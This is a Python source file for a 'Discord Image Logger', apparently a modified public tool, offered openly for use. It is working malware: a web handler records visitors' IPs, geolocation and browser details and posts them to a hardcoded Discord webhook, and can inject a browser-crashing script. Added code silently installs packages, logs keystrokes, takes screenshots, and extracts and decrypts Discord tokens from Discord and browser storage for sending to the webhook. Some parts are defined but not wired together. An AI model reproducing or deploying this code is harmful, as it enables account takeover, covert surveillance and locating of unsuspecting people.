
# Discord Image Logger
# By DeKrypt | https://github.com/kiravenom

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
import re
import os
import base64
import typing
import json
import requests
import sys
import subprocess
import time
import socket
import getpass
import platform
from PIL import ImageGrab
from tempfile import NamedTemporaryFile
from pynput import keyboard
from threading import Thread
 
if os.name != "nt":
    exit()
 
def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

modules_to_install = [("PIL", "Pillow"), ("pynput", "pynput"), ("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")]
install_import(modules_to_install)

import win32crypt
from Crypto.Cipher import AES
 
TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
 
REQUEST_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
}
__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "kira.1.9"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1432017553286500362/pexBBD9_Dw4rNVnXJN6CNvkKlBP6mXpO0mEDsxCBs8C4K33aFPgHfLZwv2zSM_naT_qp",
    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRl9xhaaYFrt20570OwLhcl9Y73my5ve5U6wQ&s", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "KIRA Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + '\\Google\\Chrome\\User Data\\Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def on_press(key):
    
    try:
        keystrokes.append(str(key))
    except Exception:
        pass

def start_keylogger(): 
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    return listener

def stop_keylogger(listener):
    
    listener.stop()

def get_system_info() -> typing.Dict[str, str]:
     
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        username = getpass.getuser()
        os_info = platform.system() + " " + platform.release()
        return {
            "Username": username,
            "Hostname": hostname,
            "IP Address": ip_address,
            "OS": os_info
        }
    except Exception:
        return {"Error": "Could not retrieve system info"}

def take_screenshot() -> str:
  
    try:
        screenshot = ImageGrab.grab()
        temp_file = NamedTemporaryFile(delete=False, suffix=".png")
        screenshot.save(temp_file.name)
        return temp_file.name
    except Exception as e:
        print(f"  {e}")
        return None

def get_tokens_from_file(file_path: str) -> typing.Union[list[str], None]:
    """ফাইল থেকে প্লেইন টেক্সট টোকেন খুঁজে বের করে"""
    try:
        with open(file_path, encoding="utf-8", errors="ignore") as text_file:
            file_contents = text_file.read()
            tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
            return tokens if tokens else None
    except (PermissionError, FileNotFoundError, Exception):
        return None

def get_encrypted_tokens(path: str) -> typing.List[str]:
    """এনক্রিপ্টেড টোকেন (leveldb থেকে) সংগ্রহ করে"""
    path += "\\Local Storage\\leveldb\\"
    tokens = []
    if not os.path.exists(path):
        return tokens
    for file in os.listdir(path):
        if not (file.endswith(".ldb") or file.endswith(".log")):
            continue
        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    for value in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(value)
        except PermissionError:
            continue
    return tokens

def get_key(path: str) -> str:
    """এনক্রিপশন কী পাওয়া"""
    try:
        with open(path + "\\Local State", "r") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
        return key
    except Exception as e:
      
        return None

def decrypt_token(token: str, key: str) -> typing.Union[str, None]:
    """এনক্রিপ্টেড টোকেন ডিক্রিপ্ট করে"""
    try:
        key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
        nonce = base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]
        ciphertext = base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt(ciphertext)[:-16].decode()
        return decrypted
    except Exception as e:
        print(f"টোকেন ডিক্রিপ্ট করতে ব্যর্থ: {e}")
        return None

def get_user_id_from_token(token: str) -> typing.Union[None, str]:
    """টোকেন থেকে ডিসকর্ড ইউজার আইডি বের করে"""
    try:
        discord_user_id = base64.b64decode(
            token.split(".", maxsplit=1)[0] + "=="
        ).decode("utf-8")
        return discord_user_id
    except Exception:
        return None

def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
    """নির্দিষ্ট পাথ থেকে প্লেইন টেক্সট টোকেন সংগ্রহ করে"""
    if not os.path.exists(base_path):
       
        return None

    id_to_tokens: typing.Dict[str, set] = {}

    for root, dirs, files in os.walk(base_path):
        for file in files:
            if file.endswith((".ldb", ".log", ".sqlite")):
                file_path = os.path.join(root, file)
                potential_tokens = get_tokens_from_file(file_path)
                if potential_tokens:
                    for token in potential_tokens:
                        discord_user_id = get_user_id_from_token(token)
                        if discord_user_id:
                            if discord_user_id not in id_to_tokens:
                                id_to_tokens[discord_user_id] = set()
                            id_to_tokens[discord_user_id].add(token)

    return id_to_tokens if id_to_tokens else None

def get_all_tokens() -> typing.Dict[str, set]:
    """সব পাথ থেকে টোকেন সংগ্রহ করে (প্লেইন টেক্সট এবং এনক্রিপ্টেড)"""
    all_tokens: typing.Dict[str, set] = {}

    # ব্রাউজার এবং ডিসকর্ড পাথ থেকে প্লেইন টেক্সট টোকেন
    browser_paths = get_browser_paths()
    for browser_path in browser_paths:
        if "Firefox" in browser_path:
            tokens = get_tokens_from_firefox_profiles(browser_path)
        else:
            tokens = get_tokens_from_path(browser_path)
        if tokens:
            for user_id, token_set in tokens.items():
                if user_id not in all_tokens:
                    all_tokens[user_id] = set()
                all_tokens[user_id].update(token_set)

    # এনক্রিপ্টেড টোকেন সংগ্রহ এবং ডিক্রিপ্ট
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        encrypted_tokens = get_encrypted_tokens(path)
        key = get_key(path)
        if not key:
            continue
        for token in encrypted_tokens:
            token = token.replace("\\", "")
            decrypted_token = decrypt_token(token, key)
            if decrypted_token:
                discord_user_id = get_user_id_from_token(decrypted_token)
                if discord_user_id:
                    if discord_user_id not in all_tokens:
                        all_tokens[discord_user_id] = set()
                    all_tokens[discord_user_id].add(decrypted_token)

    return all_tokens if all_tokens else None

def get_browser_paths() -> typing.List[str]:
    """বিভিন্ন ব্রাউজার এবং ডিসকর্ড অ্যাপের leveldb পাথের লিস্ট ফেরত দেয়"""
    local_app_data = os.getenv("LOCALAPPDATA")
    app_data = os.getenv("APPDATA")

    browser_paths = [
        os.path.join(local_app_data, r"Google\Chrome\User Data\Default\Local Storage\leveldb"),
        os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Local Storage\leveldb"),
        os.path.join(local_app_data, r"Opera Software\Opera Stable\Local Storage\leveldb"),
        os.path.join(app_data, r"Mozilla\Firefox\Profiles"),
        os.path.join(app_data, r"Discord\Local Storage\leveldb"),
    ]

    return browser_paths

def get_tokens_from_firefox_profiles(firefox_base_path: str) -> typing.Dict[str, set]:
    """Firefox প্রোফাইল থেকে টোকেন খুঁজে বের করে"""
    if not os.path.exists(firefox_base_path):
             return None

    id_to_tokens: typing.Dict[str, set] = {}

    for profile in os.listdir(firefox_base_path):
        profile_path = os.path.join(firefox_base_path, profile, "storage", "default")
        if os.path.exists(profile_path):
            for root, dirs, files in os.walk(profile_path):
                for file in files:
                    if file.endswith(".ls"):
                        file_path = os.path.join(root, file)
                        potential_tokens = get_tokens_from_file(file_path)
                        if potential_tokens:
                            for token in potential_tokens:
                                discord_user_id = get_user_id_from_token(token)
                                if discord_user_id:
                                    if discord_user_id not in id_to_tokens:
                                        id_to_tokens[discord_user_id] = set()
                                    id_to_tokens[discord_user_id].add(token)

    return id_to_tokens if id_to_tokens else None

def send_all_to_webhook(webhook_url: str, system_info: dict, keystrokes: list, tokens: dict, screenshot_path: str):
    """সব তথ্য একটি সিরিয়াল টেক্সট হিসেবে এবং স্ক্রিনশট আলাদা করে পাঠায়"""
    system_info_str = "```\n📋 System Information\n" + "\n".join([f"{key}: {value}" for key, value in system_info.items()]) + "\n```"
    keystrokes_str = "```\n⌨️ Keystrokes\n" + ("\n".join(keystrokes) if keystrokes else "No keystrokes captured.") + "\n```"
    dev = "**MADE BY —͞ＫＩＲＡ !! ** || @kira.1.9 ||"
    token_str = "```\n🔑 Tokens\n" + ("\n".join([f"User ID: {user_id}\nTokens: {', '.join(tokens[user_id])}" for user_id in tokens]) if tokens else "No tokens found.") + "\n```"

    message_content = f"{system_info_str}\n{keystrokes_str}\n{token_str}\n{dev}"

    if screenshot_path:
        with open(screenshot_path, 'rb') as file:
            files = {'file': (os.path.basename(screenshot_path), file, 'image/png')}
            data = {"content": message_content}
            response = requests.post(webhook_url, data=data, files=files)
    else:
        data = {"content": message_content}
        response = requests.post(webhook_url, json=data, headers=REQUEST_HEADERS)

    return response.status_code

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
